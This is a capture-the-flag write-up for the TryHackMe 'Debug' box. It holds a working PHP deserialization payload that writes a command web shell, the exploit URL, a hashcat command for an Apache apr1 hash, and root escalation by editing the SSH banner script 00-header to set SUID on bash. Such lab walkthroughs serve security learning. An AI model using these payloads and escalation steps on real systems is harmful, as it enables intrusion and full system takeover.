---
layout: single
title: Debug - Try Hack Me
excerpt: "Debug involves exploiting a php deserialization vulnerability for an initial foothold, escalating to james by cracking an apache password. For root we modify the ssh welcome banner."
date: 2022-01-07
classes: wide
header:
  teaser: /assets/images/thm/debug/thumbnail.png
  teaser_home_page: true
  icon: /assets/images/thm-logo.png
categories:
  - tryhackme
  - infosec
tags:  
  - php deserialization
  - apache hash
  - ssh banner
  - privesc
  - security
  - pentesting
---

![](/assets/images/thm/debug/1.png)

Hey there, welcome to the write-up for Debug, a TryHackMe box made by ustoun0 which invloves finding a backup directory which has an index.php.bak inside. Doing some code review we can quickly see that the code is vulnerable to php deserialization and we can write a shell on the webserver. Once on the box, we find a .htpasswd file which has James's hash in it, we crack it using hashcat and then we log in via ssh as James. For root we modify 00-header, we relog via ssh and get a shell as root on the box.

## Nmap

```bash
# Nmap 7.92 scan initiated Fri Jan  7 09:31:34 2022 as: nmap -sC -sV -p- -v -oN nmap/debug 10.10.24.151
Nmap scan report for 10.10.24.151
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  7 09:34:34 2022 -- 1 IP address (1 host up) scanned in 180.27 seconds
```

Nothing much of interest. Going to the webserver first.

## WebServer

![](/assets/images/thm/debug/2.png)

Just the default Apache page, the source code doesn't reveal anything. Starting up a gobuster...

```bash
┌──(miaulez㉿pentest)-[~/tryhackme/debug]
└─$ gobuster dir -u "http://10.10.201.232" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php                                         1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.201.232
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/01/07 16:59:36 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5732]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.201.232/javascript/]
/backup               (Status: 301) [Size: 315] [--> http://10.10.201.232/backup/]    
/grid                 (Status: 301) [Size: 313] [--> http://10.10.201.232/grid/]      
Progress: 7538 / 441122 (1.71%)                                                      
[!] Keyboard interrupt detected, terminating.
                                                                                      
===============================================================
2022/01/07 16:59:57 Finished
===============================================================
```

index.php and backup are the most interesting ones for now, let's check those out.

![](/assets/images/thm/debug/3.png)

Let's check backup as well

![](/assets/images/thm/debug/4.png)

index.php.bak sticks out, let's take a peek inside of it.

```php
<-- HTML SNIP -->
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
<-- HTML SNIP -->
```

If you can't tell by looking at the code, there is a massive vulnerability that just waits to be exploited :)

![](/assets/images/thm/debug/5.png)

We can provide serialized input via debug parameter. If we modify the "public $form_file = 'message.txt';" with something like shell.php, and the "public $message = '';" with some php code, serialize it and deserialize it via debug, we can write a webshell on the server and get code execution.

So I've created a little php script which will serialize the first part of the script.  

```php
class FormSubmit {

public $form_file = 'message.txt';
public $message = '';
```

We're going to modify form_file and message with our webshell

The final script we're going to use in order to exploit the deserialization vulnerability is this one.

```php
<?php

class FormSubmit {
  public $form_file = 'shell.php';
  public $message = '<?php system($_REQUEST["cmd"]); ?>';
}

$rce = new FormSubmit;
echo serialize($rce);

?>
```

Let us see how it is done.

First, we run the exploit script which will serialize our object.

![](/assets/images/thm/debug/6.png)

Then, we take that line and put it in the debug parameter, full url:

```bash
http://10.10.201.232/index.php?debug=O:10:"FormSubmit":2:{s:9:"form_file";s:9:"shell.php";s:7:"message";s:34:"<?php system($_REQUEST["cmd"]); ?>";}
```

![](/assets/images/thm/debug/7.png)

Nothing has happened, we're getting the same page, let's see if shell.php has been written on the server.

## Foothold

![](/assets/images/thm/debug/8.png)

Indeed, we do have code execution. Let's get a reverse shell.

![](/assets/images/thm/debug/9.png)

First things first, let's stabilize our shell.

![](/assets/images/thm/debug/10.png)

In the same directory we've landed our webshell, there is a hidden file called .htpasswd. In it we've got what it looks like a hash and a username called "james" which is a user on the box.

![](/assets/images/thm/debug/10-1.png)

Let's try cracking that hash with hashcat. First, let's find out what mode is needed to crack that specific hash. For that, I'm gonna go to example_hashes from hashcat's website and search for apr1.

![](/assets/images/thm/debug/11.png)

Now, I'm going to save the hash in a file called simply "hash" and crack it using rockyou.txt

```bash
hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt -O
```

![](/assets/images/thm/debug/12.png)

The hash cracks almost instantly. We can now try to log in via ssh as james.

## User

![](/assets/images/thm/debug/13.png)

Note-To-James.txt:

![](/assets/images/thm/debug/14.png)

If we remember correctly, when we've logged in via ssh, a banner appears running some uname -r things

![](/assets/images/thm/debug/15.png)

That's because of 00-header, a bash script that runs when somebody connects via ssh to a system. We can find where that is by running find with some switches to show us just files owned by root which we can modify.

```bash
find / -user root -writable 2>/dev/null
```
![](/assets/images/thm/debug/16.png)

Let's take a look at 00-header

![](/assets/images/thm/debug/17.png)

Let's modify from "$(uname -o) into "$(chmod +s /bin/bash)" and relog

![](/assets/images/thm/debug/18.png)

Since ssh runs as root and that bash script executes as root, we should set a suid bit on bash, thus running bash -p will give us a root shell.

## Rooted

![](/assets/images/thm/debug/19.png)

That was it, an easy fun box. A great learning opportunity for people who are starting out learning php deserialization attacks.
